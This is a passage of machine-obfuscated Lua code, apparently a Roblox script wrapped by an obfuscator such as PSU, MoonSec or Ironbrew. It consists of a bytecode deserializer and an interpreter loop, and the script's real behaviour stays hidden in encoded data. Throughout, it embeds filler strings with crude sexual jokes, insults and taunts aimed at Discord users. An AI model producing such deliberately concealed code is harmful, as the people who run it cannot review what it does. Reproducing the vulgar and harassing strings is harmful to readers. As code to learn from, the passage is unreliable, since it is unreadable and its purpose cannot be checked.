_l=_l_l;_lll=__llll;end;elseif(_l==(___*(_l__l^_____))-_l_l)then return(_ll==_lllll)and(_*(_l_l/__llll))or(_*(_lllll/__llll));end;return __l__l(_,_l-((_l_*(_l___))-__l))*(_lll+(_ll/(_l__l^_ll__l)));end,[(0x7a-116)]=function(_ll,_lll,_lll)local _lll;if(not _ll)then _ll=_[(123+-0x7a)]();if(_ll==_lllll)then return'';end;end;_lll=_l_l_l(_l__ll,__,__+_ll-__l);__=__+_ll;local _=''for __=_l_l,#_lll do _=___l_l(_,____ll((___lll(_l_l_l(_lll,__,__))+_l)%_l_))_l=(_l+_l__)%___ end return _;end}local function _l__ll(...)return{...},_lll_l('#',...)end local function __l_ll()local ____={};local _l__={};local _l={};local _llll={____,_l__,nil,_l};local __={}local _l_ll=(5709/0xad)local _ll={[(-#"this challenge was brought to you by bmcq"+(-41+0x55))]=(function(_l)return not(#_l==_[(0x7e-(-#"This code was obfuscated using PSU, which stands for Penis Sucking Utilities"+(-114+0x13a)))]())end),[((0x1c2/18)+-#"PSU and MoonSec winning")]=(function(_l)return _[(-#'Jahman for owner again! = 2021'+(0xfff/117))]()end),[((192-0x69)+-87)]=(function(_l)return _[(-#[[can i put my balls if your jaws]]+(0x5a-53))]()end),[(82/0x52)]=(function(_l)local __=_[(-#"how many meme strings do we have"+(0x81-91))]()local _l=''local _=1 for _ll=1,#__ do _=(_+_l_ll)%_l_ _l=___l_l(_l,____ll((___lll(__:sub(_ll,_ll))+_)%___))end return _l end)};local _l=_[(0x6f-110)]()for _l=1,_l do local _=_[((12705/0xa5)+-#'Banned for: pornographic gif of roblox character having sex with roblox dog')]();local __l;local _=_ll[_%(0xa1-120)];__[_l]=_ and _({});end;for _l_=1,_[(0x61/97)]()do local _l=_[(-#'Found an xxxxxxxxxl store for ur fat mom'+(-0x69+147))]();if(_[(912/0xe4)](_l,__l,_l_l)==__llll)then local ___=_[((50+-0x27)+-#'bitcoin')](_l,_l__l,_____);local _ll=_[(-0x54+88)](_l,_l___,_l__l+_l___);local _l={_[(0x20-29)](),_[((135+-0x42)+-#'This file has been enchanted with uncrackable V, fuck the fuck off')](),nil,nil};local ___l={[(0/0xb9)]=function()_l[___l]=_[(0x38+-53)]();_l[__ll_]=_[(-#"<@!761654159095103499> send toe nail pics"+(-0x7e+170))]();end,[((0x92-100)+-#'What is an upvalue?!? Answer the question!?*1')]=function()_l[__lll]=_[(-0x11+18)]();end,[(77-0x4b)]=function()_l[__lll]=_[(0x15-20)]()-(_l__l^_l_lll)end,[(0x1c-25)]=function()_l[_ll_]=_[((-31-0xb)+43)]()-(_l__l^_l_lll)_l[___l_]=_[(106+-0x67)]();end};___l[___]();if(_[(-#[[i loooove federal]]+(0x81-108))](_ll,_l_l,__l)==_l_l)then _l[__ll]=__[_l[_lll]]end if(_[(0x314/197)](_ll,_l__l,_l__l)==__l)then _l[___ll]=__[_l[__l_]]end if(_[(-#"this meme string was brought to you by raid shadow legends"+(5952/0x60))](_ll,_____,_____)==_l_l)then _l[__ll_]=__[_l[_ll__]]end ____[_l_]=_l;end end;for _=_l_l,_[(45-0x2c)]()do _l__[_-_l_l]=__l_ll();end;_llll[3]=_[((0x3ab5/133)+-0x6f)]();return _llll;end;local function _lllll(_,_l___,_l__)local _l=_[_l__l];local _l_=_[_____];local __=_[__l];return(function(...)local ___=_l_;local __llll=_l;local _=__l _*=-1 local _=_;local _l=__l;local _=_l__ll local __l_ll={};local _l_=__;local ___lll={...};local _____={};local __={};local _l_lll=_lll_l('#',...)-_l_l;for _=0,_l_lll do if(_>=___)then __l_ll[_-___]=___lll[_+_l_l];else __[_]=___lll[_+__l];end;end;local _=_l_lll-___+__l local _;local ___;while true do _=_l_[_l];___=_[((167-0x8c)+-#[[MoonSec V7 coming out soon]])];_ll=(2241514)while ___<=((264-0xc2)+-#[[Shouldve been the fbi bot]])do _ll-= _ll _ll=(9348987)while ___<=((8112/0xd0)+-#"while true do end")do _ll-= _ll _ll=(818362)while ___<=((0x1c0/14)+-#[[Telecrypter buggin bro]])do _ll-= _ll _ll=(4829428)while ___<=(-#"Bye bye :wave:"+(0x4b6/67))do _ll-= _ll _ll=(2010720)while ___<=(0x36/54)do _ll-= _ll _ll=(2021944)while(33+-0x21)<___ do _ll-= _ll local _=_[__ll]__[_](__[_+_l_l])break end while 2104==(_ll)/((993+-0x20))do __[_[__ll]]=_lllll(__llll[_[__l_]],nil,_l__);break end;break;end while 1180==(_ll)/((264120/0x9b))do _ll=(8848665)while(0x16-20)>=___ do _ll-= _ll __[_[__l_l]]=__[_[_l_ll]];break;end while(_ll)/((-#[[federal u suck let me do fucking emojis in here asshole]]+(410868/0x65)))==2205 do _ll=(1202733)while((117-0x4c)+-#'<@761654159095103499> shut the fuck up')<___ do _ll-= _ll _l__[_[_ll_]]=__[_[__l_l]];_l=_l+__l;_=_l_[_l];__[_[_lll]]={};_l=_l+__l;_=_l_[_l];__[_[_llll]]={};_l=_l+__l;_=_l_[_l];_l__[_[___l]]=__[_[__l_l]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];if(__[_[__l_l]]~=_[__ll_])then _l=_l+_l_l;else _l=_[_l_ll];end;break end while 3369==(_ll)/((-45+0x192))do __[_[____]]=__[_[_ll_]][_[__l__]];break end;break;end break;end break;end while 2108==(_ll)/((0x125f-2412))do _ll=(681444)while(0x43-60)>=___ do _ll-= _ll _ll=(6029569)while(25/0x5)>=___ do _ll-= _ll if(__[_[_lll]]==__[_[_lll_]])then _l=_l+_l_l;else _l=_[__l_];end;break;end while 2681==(_ll)/(((0x126a-2399)+-#'This file has been enchanted with uncrackable V, fuck the fuck off'))do _ll=(3489408)while ___>(((242880/0x2e)/55)+-#'Ruqen thinks his personality is bad, therefore he makes egregious statements to compensate')do _ll-= _ll do return end;break end while(_ll)/((1880-0x3b4))==3744 do __[_[__l_l]][_[__lll]]=__[_[_lll_]];break end;break;end break;end while(_ll)/((-0x40+271))==3292 do _ll=(1197565)while ___<=(-#[[psu is shitty]]+(-0x74+137))do _ll-= _ll __[_[_ll_l]]=(_[__lll]~=0);_l=_l+_l_l;break;end while 3281==(_ll)/((762-0x18d))do _ll=(4811950)while(135-0x7e)<___ do _ll-= _ll __[_[__ll]][__[_[__lll]]]=__[_[__l__]];break end while(_ll)/((3460+-0x5f))==1430 do do return end;break end;break;end break;end break;end break;end while 746==(_ll)/((140416/0x80))do _ll=(1673216)while ___<=(0x30/3)do _ll-= _ll _ll=(4290732)while ___<=(2093/0xa1)do _ll-= _ll _ll=(4594923)while ___<=((0xd5-161)+-#[[This file was obfuscated with Ironbrew v3]])do _ll-= _ll local ___;local _l_l;local _ll;__[_[_lll]]=_l__[_[_ll_]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=__[_[_ll_]][_[_lll_]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=__[_[_ll_]][_[___l_]];_l=_l+__l;_=_l_[_l];__[_[____]]=__[_[__l_]][_[_l_l_]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[_ll_];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[__l_];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[__l_];_l=_l+__l;_=_l_[_l];_ll=_[__ll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_ll_]))_l=_l+__l;_=_l_[_l];_l_l=_[__l_];___=__[_l_l]for _=_l_l+1,_[_l_l_]do ___=___..__[_];end;__[_[____]]=___;break;end while 1251==(_ll)/((-#[[ry s father lives in debt]]+(0xe94+-34)))do _ll=(3747357)while(144-0x84)<___ do _ll-= _ll local _l=_[__l_l]__[_l]=__[_l](____l(__,_l+__l,_[___ll]))break end while(_ll)/((0x35e86/174))==2953 do __[_[_lll]]=__[_[_l_ll]][_[_l_l_]];break end;break;end break;end while 3321==(_ll)/(((0xa6c-1347)+-#"hint: the script is in line 1"))do _ll=(11123245)while(0x91-131)>=___ do _ll-= _ll __[_[__ll]]=(_[___ll]~=0);break;end while 2735==(_ll)/((-#[[v3 has it]]+(248636/0x3d)))do _ll=(156479)while ___>(2385/0x9f)do _ll-= _ll if not __[_[__l_l]]then _l=_l+_l_l;else _l=_[_ll_];end;break end while 167==(_ll)/((0x79b-1010))do __[_[_llll]]=__[_[__lll]]-__[_[_ll__]];break end;break;end break;end break;end while 817==(_ll)/((0x1023-2083))do _ll=(166380)while ___<=((-0x7f+159)+-#[[Rogue Lineage]])do _ll-= _ll _ll=(1655451)while(-41+0x3a)>=___ do _ll-= _ll local _ll;__[_[__l_l]]=_[_ll_];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[_ll_l]][_[__l_]]=__[_[__ll_]];_l=_l+__l;_=_l_[_l];__[_[__ll]][_[_l_ll]]=__[_[__l__]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=__[_[__lll]];_l=_l+__l;_=_l_[_l];_ll=_[__ll]__[_ll](__[_ll+_l_l])_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[_ll_]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[__l_];break;end while 3591==(_ll)/((0x2b38/24))do _ll=(2540300)while ___>(58+(-#"press this check button below the message"+(0x1e+-29)))do _ll-= _ll __[_[____]][_[___ll]]=__[_[__l__]];break end while 764==(_ll)/((-#[[moonsec pls add fivem choice]]+((0x1ab2+-50)-0xd67)))do local _l___;local ___;local ____;local _ll;__[_[_llll]]=_l__[_[_ll_]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=__[_[__l_]][_[_ll__]];_l=_l+__l;_=_l_[_l];_ll=_[_lll];____=__[_[__lll]];__[_ll+1]=____;__[_ll]=____[_[___l_]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=__[_[___l]];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_ll_]))_l=_l+__l;_=_l_[_l];_ll=_[_lll];____=__[_[_l_ll]];__[_ll+1]=____;__[_ll]=____[_[__ll_]];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](__[_ll+_l_l])_l=_l+__l;_=_l_[_l];___={__,_};___[_l_l][___[_l__l][__l_l]]=___[__l][___[_l__l][_l_l_]]+___[_l_l][___[_l__l][___l]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=__[_[_l_ll]]%_[__ll_];_l=_l+__l;_=_l_[_l];_ll=_[__ll]__[_ll]=__[_ll](__[_ll+_l_l])_l=_l+__l;_=_l_[_l];____=_[_ll_];_l___=__[____]for _=____+1,_[__l__]do _l___=_l___..__[_];end;__[_[_ll_l]]=_l___;_l=_l+__l;_=_l_[_l];___={__,_};___[_l_l][___[_l__l][_lll]]=___[__l][___[_l__l][_lll_]]+___[_l_l][___[_l__l][___ll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=__[_[__l_]]%_[_ll__];break end;break;end break;end while 141==(_ll)/((-#'Oh, so you know what banging is? Bang every single woman in your location.'+(2632-0x562)))do _ll=(2502990)while(((-115+0xdfc)/0x37)+-#"This script was obfuscated by Herttfuscator")>=___ do _ll-= _ll if(__[_[__ll]]~=__[_[_lll_]])then _l=_l+_l_l;else _l=_[___ll];end;break;end while(_ll)/((58499/0x3d))==2610 do _ll=(1809984)while ___>(0x25+-16)do _ll-= _ll local ___=__llll[_[___l]];local __l;local _ll={};__l=__ll_l({},{__index=function(_l,_)local _=_ll[_];return _[1][_[2]];end,__newindex=function(__,_,_l)local _=_ll[_]_[1][_[2]]=_l;end;});for __l=1,_[_ll__]do _l=_l+_l_l;local _=_l_[_l];if _[(104-0x67)]==23 then _ll[__l-1]={__,_[__lll]};else _ll[__l-1]={_l___,_[_ll_]};end;_____[#_____+1]=_ll;end;__[_[__ll]]=_lllll(___,__l,_l__);break end while(_ll)/(((-124+0xab7)+-#"hey psst you the wrapper function is right there"))==704 do __[_[____]]=_l___[_[___ll]];break end;break;end break;end break;end break;end break;end while(_ll)/((0x15aa-2789))==3391 do _ll=(1611225)while ___<=(143+-0x6e)do _ll-= _ll _ll=(6157206)while(4239/0x9d)>=___ do _ll-= _ll _ll=(271236)while(4704/0xc4)>=___ do _ll-= _ll _ll=(287742)while ___>(-#[[Rynin babasi kredi borcuna girdi]]+(6160/0x70))do _ll-= _ll __[_[_lll]]={};break end while(_ll)/((-115+0xc89))==93 do __[_[__l_l]]=__[_[__l_]];break end;break;end while 3229==(_ll)/((-#[[Please proceed to translate Keys Cow to filipino]]+(-123+0xff)))do _ll=(501423)while(3450/0x8a)>=___ do _ll-= _ll local _l=_[__ll]__[_l]=__[_l](____l(__,_l+__l,_[__l_]))break;end while 129==(_ll)/((-#'perth thinks psu is bad (it is) and uses ms priv'+(7950-0xfaf)))do _ll=(1356446)while((126+-0x4f)+-#'Shard fard poo gaymer')<___ do _ll-= _ll __[_[____]]=(_[__lll]~=0);break end while(_ll)/((0x13a04/198))==3341 do local _ll=_[__ll];local __l=__[_ll]local _l_=__[_ll+2];if(_l_>0)then if(__l>__[_ll+1])then _l=_[___l];else __[_ll+3]=__l;end elseif(__l<__[_ll+1])then _l=_[___l];else __[_ll+3]=__l;end break end;break;end break;end break;end while(_ll)/((0x1f55-4028))==1542 do _ll=(6224400)while ___<=(-0x13+49)do _ll-= _ll _ll=(3668490)while ___<=(-#'<@761654159095103499> <@761654159095103499> <@761654159095103499> <@761654159095103499> <@761654159095103499>'+(0x147-190))do _ll-= _ll local _ll=_[__l_];local _l=__[_ll]for _=_ll+1,_[__ll_]do _l=_l..__[_];end;__[_[__l_l]]=_l;break;end while(_ll)/((((589745/0xd7)-1425)+-#[[Brick Lucas Deez Peanuts]]))==2835 do _ll=(1371312)while(2900/0x64)<___ do _ll-= _ll __[_[__l_l]]=_lllll(__llll[_[___l]],nil,_l__);break end while(_ll)/((0x11bb0/51))==963 do local _ll=_[__l_l];local __l=__[_ll]local _l_=__[_ll+2];if(_l_>0)then if(__l>__[_ll+1])then _l=_[___l];else __[_ll+3]=__l;end elseif(__l<__[_ll+1])then _l=_[___l];else __[_ll+3]=__l;end break end;break;end break;end while 2730==(_ll)/(((0x127c-2376)+-#"This code was obfuscated using PSU, which stands for Penis Sucking Utilities"))do _ll=(8188620)while ___<=(3906/0x7e)do _ll-= _ll if __[_[_llll]]then _l=_l+__l;else _l=_[_l_ll];end;break;end while(_ll)/((-#"guys listen... sussex XD"+(-86+0xcad)))==2612 do _ll=(10175142)while(-#"I love moonsec (give me free moonsex premium now daddy fed pleeaaase I said the thing)"+(326-0xd0))<___ do _ll-= _ll __[_[__ll]]=_l___[_[__l_]];break end while 3863==(_ll)/((-0x2c+2678))do if(__[_[_ll_l]]~=_[_lll_])then _l=_l+_l_l;else _l=_[__l_];end;break end;break;end break;end break;end break;end while 1953==(_ll)/(((3551-0x6f9)-0x3ad))do _ll=(6978762)while(-83+0x7a)>=___ do _ll-= _ll _ll=(8419871)while(159+-0x7b)>=___ do _ll-= _ll _ll=(2831760)while ___<=(152-0x76)do _ll-= _ll if(__[_[____]]~=_[___l_])then _l=_l+_l_l;else _l=_[___l];end;break;end while 1710==(_ll)/((1773+-0x75))do _ll=(10256336)while ___>(-#"Luraph v14 ETA?"+(0x2d1e/231))do _ll-= _ll __[_[_lll]]=_[_ll_];break end while(_ll)/((-98+0xe3a))==2894 do local ___;local _ll;_ll=_[_llll];___=__[_[___ll]];__[_ll+1]=___;__[_ll]=___[_[_ll__]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[____]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[__l_l]][_[__lll]]=__[_[_lll_]];break end;break;end break;end while 3413==(_ll)/((0x63fb2/166))do _ll=(2991360)while ___<=(82+-0x2d)do _ll-= _ll local _l=_[_llll];local _ll=__[_l];for _=_l+1,_[_l_ll]do _ll_ll(_ll,__[_])end;break;end while 1216==(_ll)/((-0x4c+2536))do _ll=(763508)while(4598/0x79)<___ do _ll-= _ll _l__[_[___ll]]=__[_[_ll_l]];break end while 772==(_ll)/((2043-0x41e))do local ___=__llll[_[___ll]];local __l;local _ll={};__l=__ll_l({},{__index=function(_l,_)local _=_ll[_];return _[1][_[2]];end,__newindex=function(__,_,_l)local _=_ll[_]_[1][_[2]]=_l;end;});for __l=1,_[_ll__]do _l=_l+_l_l;local _=_l_[_l];if _[(0x5a/90)]==23 then _ll[__l-1]={__,_[__lll]};else _ll[__l-1]={_l___,_[_ll_]};end;_____[#_____+1]=_ll;end;__[_[_ll_l]]=_lllll(___,__l,_l__);break end;break;end break;end break;end while 4074==(_ll)/((-0x23+1748))do _ll=(8262540)while((0xd6-133)+-#[[<@!847154787934011462> shut the fuck up]])>=___ do _ll-= _ll _ll=(9504890)while ___<=(0x1ef0/198)do _ll-= _ll local _ll=_[__l_];local _l=__[_ll]for _=_ll+1,_[_l_l_]do _l=_l..__[_];end;__[_[_ll_l]]=_l;break;end while(_ll)/((5026-0x9e0))==3805 do _ll=(2821309)while ___>(0x1e1c/188)do _ll-= _ll __[_[__ll]]={};break end while(_ll)/(((326533/(148+-0x2f))+-#"win+L = solution"))==877 do local _={__,_};_[_l_l][_[_l__l][____]]=_[__l][_[_l__l][__ll_]]+_[_l_l][_[_l__l][___ll]];break end;break;end break;end while(_ll)/(((8005-0xfdf)+-0x5a))==2145 do _ll=(1195936)while(-0x27+82)>=___ do _ll-= _ll local _l_l;local ___;local _ll;__[_[_ll_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=#__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[__lll];_l=_l+__l;_=_l_[_l];_ll=_[_lll];___=__[_ll]_l_l=__[_ll+2];if(_l_l>0)then if(___>__[_ll+1])then _l=_[_ll_];else __[_ll+3]=___;end elseif(___<__[_ll+1])then _l=_[___ll];else __[_ll+3]=___;end break;end while 304==(_ll)/((688450/0xaf))do _ll=(4243860)while ___>(-#'why do guys only want bitchy bimbos who walk all over them'+(309-0xcf))do _ll-= _ll __[_[____]]=_[___l];break end while(_ll)/((1209+-0x7d))==3915 do local _l=_[____];local _ll=__[_[___l]];__[_l+1]=_ll;__[_l]=_ll[_[__l__]];break end;break;end break;end break;end break;end break;end break;end while(_ll)/(((3273-0x671)+-#"Guys help theyve captured me and lock me inside the obfuscator!!!! debofuscate quick to save me"))==1466 do _ll=(5676900)while(-#"soonmec"+(168+(-102+0x9)))>=___ do _ll-= _ll _ll=(150404)while((256-0xb6)+-#'table.concat = nil')>=___ do _ll-= _ll _ll=(272286)while ___<=(0x6a+-56)do _ll-= _ll _ll=(229086)while ___<=(212-0xa5)do _ll-= _ll _ll=(2105006)while(-0x68+150)<___ do _ll-= _ll __[_[____]][__[_[_ll_]]]=__[_[_ll__]];break end while(_ll)/(((-#"Moonsec v6 coming out in 1 day"+(1483+-0x2e))-0x2d4))==3082 do do return __[_[_ll_l]]end break end;break;end while(_ll)/((-30+0x93))==1958 do _ll=(91482)while(4800/(13200/0x84))>=___ do _ll-= _ll __[_[__ll]][_[__l_]]=_[_ll__];break;end while(_ll)/((-#"Slowmode is enabled."+(0x21d-328)))==474 do _ll=(451536)while ___>(-#[[bit.bdiv(0,0)]]+(192-0x82))do _ll-= _ll local _ll;__[_[__l_l]]=_[___l];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[__lll]))_l=_l+__l;_=_l_[_l];__[_[____]][_[_ll_]]=__[_[_l_l_]];_l=_l+__l;_=_l_[_l];__[_[____]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[____]]=__[_[__lll]][_[__ll_]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[_ll_];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[__l_];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[_ll_];_l=_l+__l;_=_l_[_l];_ll=_[__ll]__[_ll]=__[_ll](____l(__,_ll+__l,_[__l_]))break end while(_ll)/((0x67d-843))==552 do __[_[____]]=_l__[_[_ll_]];break end;break;end break;end break;end while 126==(_ll)/((4361-0x898))do _ll=(3788520)while ___<=(-30+0x53)do _ll-= _ll _ll=(2406079)while(-#'totally obfuscated with luraph'+(0xbe+-109))>=___ do _ll-= _ll _l=_[__lll];break;end while(_ll)/((0x16489/119))==3137 do _ll=(662400)while(-32+(2016/0x18))<___ do _ll-= _ll _l___[_[_ll_]]=__[_[_llll]];break end while(_ll)/(((-42+0x9e6)+-#'me receiving a pipebomb in my mailbox after submitting a meme string with special characters'))==276 do local _=_[__l_l]__[_]=__[_](__[_+_l_l])break end;break;end break;end while 1446==(_ll)/((0xa8b+-79))do _ll=(4374141)while(1242/0x17)>=___ do _ll-= _ll local _ll;__[_[____]]=_[___l];_l=_l+__l;_=_l_[_l];_ll=_[____]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l_ll]))_l=_l+__l;_=_l_[_l];_ll=_[____]__[_ll](__[_ll+_l_l])_l=_l+__l;_=_l_[_l];__[_[__ll]]=_l__[_[__lll]];_l=_l+__l;_=_l_[_l];__[_[____]]=__[_[___l]][_[_l_l_]];_l=_l+__l;_=_l_[_l];if not __[_[_ll_l]]then _l=_l+_l_l;else _l=_[___ll];end;break;end while 1973==(_ll)/((512127/0xe7))do _ll=(14940960)while(10945/0xc7)<___ do _ll-= _ll _l__[_[_l_ll]]=__[_[__ll]];break end while 4080==(_ll)/(((0x1d42-3798)+-#'How did adam and eve populate?'))do local _l=_[____];local _ll=__[_[_ll_]];__[_l+1]=_ll;__[_l]=_ll[_[__l__]];break end;break;end break;end break;end break;end while 76==(_ll)/((-#"Federal spilled out the milk"+(0x2056e/66)))do _ll=(10902114)while(89+-0x1b)>=___ do _ll-= _ll _ll=(4349536)while ___<=(-#'shithub verified'+(-94+0xa9))do _ll-= _ll _ll=(791718)while(0xdce/62)>=___ do _ll-= _ll __[_[____]]=__[_[__l_]][__[_[_lll_]]];break;end while(_ll)/((1088+-0x31))==762 do _ll=(4221270)while ___>(-91+0x95)do _ll-= _ll __[_[_lll]]=_l___[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=#__[_[___ll]];_l=_l+__l;_=_l_[_l];_l___[_[__lll]]=__[_[__ll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l___[_[_ll_]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=#__[_[__l_]];_l=_l+__l;_=_l_[_l];_l___[_[_l_ll]]=__[_[__ll]];_l=_l+__l;_=_l_[_l];do return end;break end while(_ll)/((-#"This file was obfuscated with Ironbrew v3"+(425484/0x9f)))==1602 do local ___;local _ll;__[_[__ll]]=_l__[_[_ll_]];_l=_l+__l;_=_l_[_l];_ll=_[_ll_l];___=__[_[___l]];__[_ll+1]=___;__[_ll]=___[_[___l_]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[__lll];_l=_l+__l;_=_l_[_l];_ll=_[____]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];_ll=_[_llll];___=__[_[___l]];__[_ll+1]=___;__[_ll]=___[_[___l_]];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=__[_[___l]];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[_llll]]={};_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[____]]=_[__l_];break end;break;end break;end while(_ll)/((0xc7c+-35))==1376 do _ll=(8076531)while(140-0x50)>=___ do _ll-= _ll __[_[__l_l]][_[__l_]]=_[_lll_];break;end while(_ll)/((0x118b-2274))==3643 do _ll=(12023004)while ___>(-#'hank hub, more like wank hum xdxdxd, shutup'+(0x2698/95))do _ll-= _ll local _=_[____]__[_]=__[_](__[_+_l_l])break end while(_ll)/((-#[[Wocky Slush]]+(0xdc7+-72)))==3491 do local _ll;__[_[_lll]]=_[___l];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[__ll]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[__lll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[__l_];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[__l_]))_l=_l+__l;_=_l_[_l];__[_[_llll]][__[_[__lll]]]=__[_[_l_l_]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_l__[_[__lll]];_l=_l+__l;_=_l_[_l];if __[_[_llll]]then _l=_l+__l;else _l=_[_ll_];end;break end;break;end break;end break;end while(_ll)/((0xc53+-41))==3501 do _ll=(13846008)while(0xd6-149)>=___ do _ll-= _ll _ll=(1281922)while(-98+(416-0xff))>=___ do _ll-= _ll __[_[_lll]]=#__[_[_l_ll]];break;end while 562==(_ll)/((2350+-0x45))do _ll=(173184)while ___>(-#"Yeah this is getting cringe-"+(0x10e-178))do _ll-= _ll __[_[_lll]][__[_[__lll]]]=_[_l_l_];break end while 246==(_ll)/((-#[[hey psst you the wrapper function is right there]]+(0x319+-41)))do __[_[_ll_l]]=__[_[_l_ll]]%_[_ll__];break end;break;end break;end while 3516==(_ll)/((-#"im living"+(-0x55+4032)))do _ll=(6376960)while ___<=(-#'Brick Lucas Deez Peanuts'+(113+-0x17))do _ll-= _ll local _ll;__[_[_llll]]={};_l=_l+__l;_=_l_[_l];__[_[____]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[__lll];_l=_l+__l;_=_l_[_l];__[_[_ll_l]]=_[__lll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[__lll];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[_lll]][_[__l_]]=__[_[___l_]];_l=_l+__l;_=_l_[_l];__[_[__ll]][_[_ll_]]=__[_[___l_]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[__ll]]=_[__lll];break;end while(_ll)/((-#[[Ruqen thinks his personality is bad, therefore he makes egregious statements to compensate]]+(2041+((-380/0x13)+-#[[someone play kogama with perth please hes so lonely]]))))==3392 do _ll=(2255700)while ___>(144+-0x4d)do _ll-= _ll __[_[__ll]][__[_[__l_]]]=_[__ll_];break end while 2060==(_ll)/((241995/0xdd))do if __[_[_llll]]then _l=_l+__l;else _l=_[__lll];end;break end;break;end break;end break;end break;end break;end while 3725==(_ll)/(((((-127+0x2b538)+-#'this challenge was brought to you by bmcq')/0x70)+-#'when the drip is respectable but the script is undetectable'))do _ll=(823150)while(-#"me waiting for a memestring that isnt about sex or someone being a pedo"+(0x109+-115))>=___ do _ll-= _ll _ll=(746910)while(129+-0x38)>=___ do _ll-= _ll _ll=(2713785)while ___<=(-0x3d+131)do _ll-= _ll _ll=(9772068)while(-0x24+105)<___ do _ll-= _ll local _={__,_};_[_l_l][_[_l__l][_lll]]=_[__l][_[_l__l][_lll_]]+_[_l_l][_[_l__l][___ll]];break end while 2892==(_ll)/((0x3d0be/(-#"c0ck"+(183+-0x69))))do if not __[_[_ll_l]]then _l=_l+_l_l;else _l=_[__lll];end;break end;break;end while(_ll)/((6828-0xd5f))==797 do _ll=(5018662)while ___<=((-88+0xc1)+-0x22)do _ll-= _ll _l___[_[_ll_]]=__[_[__ll]];break;end while 3454==(_ll)/((0x4a7ea/210))do _ll=(8016368)while(-#'This file has been enchanted with uncrackable V, fuck the fuck off'+(21252/0x9a))<___ do _ll-= _ll __[_[__ll]]=__[_[__lll]]%_[___l_];break end while(_ll)/(((0xe6d+-37)+-#[[Ruqen thinks his personality is bad, therefore he makes egregious statements to compensate]]))==2248 do local ___;local _ll;__[_[_llll]]=_l__[_[__lll]];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[__lll];_l=_l+__l;_=_l_[_l];__[_[____]]=_[__lll];_l=_l+__l;_=_l_[_l];__[_[_lll]]=_[__l_];_l=_l+__l;_=_l_[_l];_ll=_[_lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];__[_[__l_l]][__[_[_ll_]]]=_[__ll_];_l=_l+__l;_=_l_[_l];_ll=_[_ll_l];___=__[_ll];for _=_ll+1,_[_ll_]do _ll_ll(___,__[_])end;break end;break;end break;end break;end while(_ll)/((592-0x14e))==2895 do 